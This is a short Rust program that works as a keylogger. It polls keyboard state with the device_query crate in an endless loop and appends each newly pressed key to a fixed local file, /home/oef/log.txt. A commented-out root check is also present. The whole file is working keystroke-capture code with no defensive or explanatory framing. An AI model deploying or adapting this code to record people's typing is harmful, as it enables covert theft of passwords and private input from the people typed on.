use std::fs::OpenOptions;
use std::io::Write;
use device_query::{DeviceQuery, DeviceState};

fn main() {

    //println!("{}", is_root());

    let device_state = DeviceState::new();

    let mut prev_keys = vec![];

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("/home/oef/log.txt")
        .expect("Failed to open file");

    loop {        
        let keys = device_state.get_keys();
        
        if keys != prev_keys && !keys.is_empty() {
            // println!("[{:?}] [Keyboard] {:?}", local, keys);
            print!("{:?}", keys[0]);
            write!(file, "{:?}",  keys[0]).expect("Failed to write to file");
        }
        
        
        prev_keys = keys;
    }
}



